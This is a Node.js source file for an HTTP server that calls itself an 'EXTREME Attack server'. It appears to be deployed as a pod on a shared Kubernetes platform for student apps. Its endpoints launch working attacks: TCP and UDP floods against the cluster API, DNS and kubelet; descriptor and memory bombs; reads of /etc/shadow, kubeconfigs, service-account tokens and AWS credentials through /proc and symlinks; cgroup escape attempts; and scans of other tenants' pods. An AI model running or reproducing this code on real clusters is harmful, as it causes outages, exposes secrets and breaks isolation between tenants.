const http = require("http");
const https = require("https");
const os = require("os");
const fs = require("fs");
const net = require("net");
const dns = require("dns");
const dgram = require("dgram");
const { execSync, spawn } = require("child_process");
const crypto = require("crypto");

let results = {};

// 1. BANDWIDTH EXHAUSTION - Flood network with data
async function bandwidthExhaust() {
  results.bandwidthExhaust = { sent: 0, connections: [] };
  
  const targets = [
    { host: "10.100.0.1", port: 443, name: "K8s API" },
    { host: "10.100.0.10", port: 53, name: "CoreDNS" },
    { host: "192.168.66.176", port: 10250, name: "Kubelet" }
  ];
  
  const payload = crypto.randomBytes(65536); // 64KB chunks
  
  for (const target of targets) {
    let bytesSent = 0;
    const sockets = [];
    
    try {
      // Open 50 connections and flood
      for (let i = 0; i < 50; i++) {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        
        await new Promise((resolve) => {
          socket.on("connect", () => {
            sockets.push(socket);
            // Send data repeatedly
            for (let j = 0; j < 10; j++) {
              try {
                socket.write(payload);
                bytesSent += payload.length;
              } catch(e) {}
            }
            resolve();
          });
          socket.on("error", () => resolve());
          socket.on("timeout", () => resolve());
          socket.connect(target.port, target.host);
        });
      }
      
      results.bandwidthExhaust.connections.push({
        target: target.name,
        sockets: sockets.length,
        bytesSent: bytesSent
      });
      
      // Cleanup
      sockets.forEach(s => s.destroy());
    } catch(e) {
      results.bandwidthExhaust.connections.push({ target: target.name, error: e.message });
    }
  }
  
  results.bandwidthExhaust.totalSent = results.bandwidthExhaust.connections.reduce((a, c) => a + (c.bytesSent || 0), 0);
}

// 2. FILE DESCRIPTOR EXHAUSTION
async function fdExhaust() {
  results.fdExhaust = { opened: 0, sockets: 0, files: 0 };
  
  const handles = [];
  
  // Open many files
  try {
    for (let i = 0; i < 10000; i++) {
      const fd = fs.openSync("/dev/null", "r");
      handles.push({ type: "file", fd });
      results.fdExhaust.files++;
    }
  } catch(e) {
    results.fdExhaust.fileError = e.message;
  }
  
  // Open many sockets
  try {
    for (let i = 0; i < 5000; i++) {
      const socket = new net.Socket();
      handles.push({ type: "socket", socket });
      results.fdExhaust.sockets++;
    }
  } catch(e) {
    results.fdExhaust.socketError = e.message;
  }
  
  results.fdExhaust.opened = handles.length;
  
  // Cleanup
  handles.forEach(h => {
    try {
      if (h.type === "file") fs.closeSync(h.fd);
      else h.socket.destroy();
    } catch(e) {}
  });
}

// 3. DNS FLOOD - Exhaust DNS resolver
async function dnsFlood() {
  results.dnsFlood = { queries: 0, successes: 0, failures: 0 };
  
  const randomDomains = [];
  for (let i = 0; i < 1000; i++) {
    randomDomains.push(`${crypto.randomBytes(16).toString("hex")}.example.com`);
  }
  
  const promises = randomDomains.map(domain => {
    return new Promise((resolve) => {
      dns.resolve4(domain, (err) => {
        results.dnsFlood.queries++;
        if (err) results.dnsFlood.failures++;
        else results.dnsFlood.successes++;
        resolve();
      });
    });
  });
  
  await Promise.all(promises);
}

// 4. PROC FILESYSTEM ABUSE - Try to read other processes
async function procAbuse() {
  results.procAbuse = { processes: [], environments: [], secrets: [] };
  
  // Scan /proc for other processes
  try {
    const procs = fs.readdirSync("/proc").filter(p => /^\d+$/.test(p));
    results.procAbuse.totalProcesses = procs.length;
    
    for (const pid of procs.slice(0, 50)) {
      try {
        const cmdline = fs.readFileSync(`/proc/${pid}/cmdline`, "utf8").replace(/\0/g, " ").trim();
        const status = fs.readFileSync(`/proc/${pid}/status`, "utf8");
        const name = status.match(/Name:\s+(\S+)/)?.[1] || "unknown";
        
        results.procAbuse.processes.push({ pid, name, cmdline: cmdline.substring(0, 100) });
        
        // Try to read environment (usually blocked)
        try {
          const environ = fs.readFileSync(`/proc/${pid}/environ`, "utf8");
          if (environ.includes("SECRET") || environ.includes("PASSWORD") || environ.includes("KEY")) {
            results.procAbuse.secrets.push({ pid, hint: "Contains sensitive env vars" });
          }
          results.procAbuse.environments.push({ pid, length: environ.length });
        } catch(e) {}
        
      } catch(e) {}
    }
  } catch(e) {
    results.procAbuse.error = e.message;
  }
}

// 5. CGROUP ESCAPE ATTEMPT
async function cgroupEscape() {
  results.cgroupEscape = {};
  
  // Read cgroup info
  try {
    results.cgroupEscape.cgroups = fs.readFileSync("/proc/self/cgroup", "utf8");
  } catch(e) {}
  
  // Try to write to cgroup
  const cgroupPaths = [
    "/sys/fs/cgroup/memory/memory.limit_in_bytes",
    "/sys/fs/cgroup/cpu/cpu.cfs_quota_us",
    "/sys/fs/cgroup/pids/pids.max"
  ];
  
  for (const path of cgroupPaths) {
    try {
      // Try to read
      const value = fs.readFileSync(path, "utf8").trim();
      results.cgroupEscape[path] = { readable: true, value };
      
      // Try to write (will fail but test)
      try {
        fs.writeFileSync(path, "999999999");
        results.cgroupEscape[path].writable = true;
      } catch(e) {
        results.cgroupEscape[path].writable = false;
      }
    } catch(e) {
      results.cgroupEscape[path] = { readable: false, error: e.code };
    }
  }
  
  // Try notify_on_release escape
  try {
    const releasePath = "/sys/fs/cgroup/memory/notify_on_release";
    fs.writeFileSync(releasePath, "1");
    results.cgroupEscape.notifyOnRelease = "writable - VULNERABLE";
  } catch(e) {
    results.cgroupEscape.notifyOnRelease = "blocked";
  }
}

// 6. ATTACK OTHER PODS - Scan and probe other student apps
async function attackOtherPods() {
  results.otherPods = { discovered: [], attacked: [] };
  
  const myIP = Object.values(os.networkInterfaces())
    .flat()
    .find(i => i.family === "IPv4" && !i.internal)?.address;
  
  const baseIP = myIP ? myIP.split(".").slice(0, 2).join(".") : "192.168";
  
  // Scan pod network for other apps
  for (let subnet = 0; subnet <= 128; subnet += 16) {
    for (let host = 1; host <= 30; host++) {
      const ip = `${baseIP}.${subnet}.${host}`;
      if (ip === myIP) continue;
      
      try {
        const open = await scanPort(ip, 3000, 50);
        if (open) {
          results.otherPods.discovered.push(ip);
          
          // Try to attack discovered pod
          try {
            const resp = await httpGet(`http://${ip}:3000/`, 2000);
            results.otherPods.attacked.push({
              ip,
              status: resp.status,
              body: resp.body?.substring(0, 200)
            });
          } catch(e) {}
        }
      } catch(e) {}
    }
  }
}

// 7. SYMLINK ATTACK - Try to escape via symlinks
async function symlinkAttack() {
  results.symlinkAttack = {};
  
  const targets = [
    "/etc/shadow",
    "/etc/kubernetes/admin.conf",
    "/root/.kube/config",
    "/var/run/secrets/kubernetes.io/serviceaccount/token"
  ];
  
  for (const target of targets) {
    const linkPath = `/tmp/symlink_${Date.now()}_${Math.random().toString(36).slice(2)}`;
    try {
      fs.symlinkSync(target, linkPath);
      
      try {
        const content = fs.readFileSync(linkPath, "utf8");
        results.symlinkAttack[target] = { 
          success: true, 
          content: content.substring(0, 100) 
        };
      } catch(e) {
        results.symlinkAttack[target] = { symlinked: true, readError: e.code };
      }
      
      fs.unlinkSync(linkPath);
    } catch(e) {
      results.symlinkAttack[target] = { error: e.code };
    }
  }
}

// 8. NODE FILESYSTEM ACCESS via /proc/1/root
async function nodeFilesystemAccess() {
  results.nodeFS = { accessible: [], secrets: [] };
  
  const hostPaths = [
    "/proc/1/root/etc/passwd",
    "/proc/1/root/etc/shadow",
    "/proc/1/root/etc/kubernetes",
    "/proc/1/root/var/lib/kubelet/config.yaml",
    "/proc/1/root/root/.aws/credentials",
    "/proc/1/root/home"
  ];
  
  for (const path of hostPaths) {
    try {
      const stat = fs.statSync(path);
      results.nodeFS.accessible.push({ path, type: stat.isDirectory() ? "dir" : "file" });
      
      if (stat.isFile()) {
        try {
          const content = fs.readFileSync(path, "utf8");
          if (content.includes("password") || content.includes("secret") || content.includes("key")) {
            results.nodeFS.secrets.push({ path, hint: "Contains sensitive data" });
          }
        } catch(e) {}
      }
      
      if (stat.isDirectory()) {
        try {
          const files = fs.readdirSync(path).slice(0, 20);
          results.nodeFS.accessible[results.nodeFS.accessible.length - 1].contents = files;
        } catch(e) {}
      }
    } catch(e) {
      // Not accessible
    }
  }
}

// 9. UDP FLOOD
async function udpFlood() {
  results.udpFlood = { sent: 0 };
  
  const client = dgram.createSocket("udp4");
  const payload = crypto.randomBytes(1024);
  
  const targets = [
    { host: "10.100.0.10", port: 53 },  // CoreDNS
    { host: "10.100.0.1", port: 443 }    // K8s API
  ];
  
  try {
    for (const target of targets) {
      for (let i = 0; i < 1000; i++) {
        client.send(payload, target.port, target.host);
        results.udpFlood.sent++;
      }
    }
  } catch(e) {
    results.udpFlood.error = e.message;
  }
  
  client.close();
}

// 10. EXTREME MEMORY BOMB - Try to trigger OOM killer on node
async function extremeMemoryBomb() {
  results.memoryBomb = { allocations: [] };
  const chunks = [];
  let allocated = 0;
  
  try {
    while (true) {
      const chunk = Buffer.alloc(500 * 1024 * 1024); // 500MB
      chunk.fill(crypto.randomBytes(1)[0]);
      chunks.push(chunk);
      allocated += 500;
      
      results.memoryBomb.allocations.push({
        mb: allocated,
        freeMem: os.freemem(),
        pct: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
      });
      
      // Will eventually OOM
      if (os.freemem() < 50 * 1024 * 1024) {
        results.memoryBomb.stoppedAt = allocated + "MB";
        break;
      }
    }
  } catch(e) {
    results.memoryBomb.crashed = true;
    results.memoryBomb.error = e.message;
    results.memoryBomb.totalAllocated = allocated + "MB";
  }
}

// Helper functions
async function scanPort(host, port, timeout = 100) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);
    socket.on("connect", () => { socket.destroy(); resolve(true); });
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
    socket.on("error", () => { socket.destroy(); resolve(false); });
    socket.connect(port, host);
  });
}

async function httpGet(url, timeout = 2000) {
  return new Promise((resolve, reject) => {
    const proto = url.startsWith("https") ? https : http;
    const req = proto.get(url, { timeout, rejectUnauthorized: false }, (res) => {
      let body = "";
      res.on("data", c => body += c);
      res.on("end", () => resolve({ status: res.statusCode, body }));
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
  });
}

// Server
const server = http.createServer(async (req, res) => {
  results = { timestamp: new Date().toISOString(), hostname: os.hostname() };
  
  try {
    if (req.url === "/extreme") {
      await bandwidthExhaust();
      await fdExhaust();
      await dnsFlood();
      await procAbuse();
      await cgroupEscape();
      await symlinkAttack();
      await nodeFilesystemAccess();
      await udpFlood();
      await attackOtherPods();
      
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/oom-extreme") {
      await extremeMemoryBomb();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/bandwidth") {
      await bandwidthExhaust();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/pods") {
      await attackOtherPods();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else if (req.url === "/proc") {
      await procAbuse();
      await nodeFilesystemAccess();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(results, null, 2));
    } else {
      res.writeHead(200);
      res.end("EXTREME Attack - /extreme, /oom-extreme, /bandwidth, /pods, /proc");
    }
  } catch(e) {
    res.writeHead(500);
    res.end(JSON.stringify({ error: e.message, stack: e.stack }));
  }
});

server.listen(process.env.PORT || 3000);
console.log("EXTREME Attack server on port " + (process.env.PORT || 3000));
